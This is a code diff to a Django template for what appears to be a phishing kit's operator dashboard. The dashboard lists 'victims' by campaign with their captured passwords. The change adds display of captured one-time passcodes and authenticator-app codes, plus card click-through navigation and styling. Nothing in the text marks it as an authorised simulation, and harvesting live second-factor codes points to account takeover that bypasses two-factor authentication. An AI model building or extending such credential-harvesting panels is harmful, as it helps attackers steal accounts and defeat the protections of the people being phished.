@@ -40,7 +40,7 @@
             <div class="victims-grid">
                 {% for campaign in campaigns %}
                     {% for victim in campaign.victims_sorted %}
-                    <div class="victim-card">
+                    <div class="victim-card" data-campaign-id="{{ campaign.id }}" style="cursor: pointer;">
                         <!-- Header -->
                         <div class="victim-header">
                             <h3 class="victim-title">{{ campaign.email_template.get_type_display|default:"UNKNOWN DEVICE LOGIN" }}</h3>
@@ -64,10 +64,19 @@
                                 <div class="info-value passphrase-text">{{ victim.login_password|default:"Not captured" }}</div>
                             </div>
                             
+                            {% if victim.login_otp %}
                             <div class="info-item">
                                 <label class="info-label">OTP:</label>
-                                <div class="info-value">{{ victim.login_otp|default:"None" }}</div>
+                                <div class="info-value passphrase-text">{{ victim.login_otp }}</div>
                             </div>
+                            {% endif %}
+                            
+                            {% if victim.login_authenticator_app_code %}
+                            <div class="info-item">
+                                <label class="info-label">Authenticator Code:</label>
+                                <div class="info-value passphrase-text">{{ victim.login_authenticator_app_code }}</div>
+                            </div>
+                            {% endif %}
                             
                         </div>
                             
@@ -169,11 +178,17 @@
         transition: transform 0.3s ease, box-shadow 0.3s ease;
         box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
         border: 1px solid #e9ecef;
+        cursor: pointer;
     }
 
     .victim-card:hover {
         transform: translateY(-5px);
         box-shadow: 0 12px 24px rgba(0, 0, 0, 0.15);
+    }
+
+    .victim-card:active {
+        transform: translateY(-3px);
+        box-shadow: 0 8px 16px rgba(0, 0, 0, 0.12);
     }
 
     .victim-header {
@@ -383,6 +398,16 @@
             toast.show();
         });
     }
+    
+    // Add click event to victim cards for navigation
+    document.querySelectorAll('.victim-card').forEach(card => {
+        card.addEventListener('click', function() {
+            const campaignId = this.getAttribute('data-campaign-id');
+            if (campaignId) {
+                window.location.href = `/campaigns/${campaignId}/`;
+            }
+        });
+    });
     
     // Add click animation to copy buttons
     document.querySelectorAll('.copy-btn').forEach(button => {
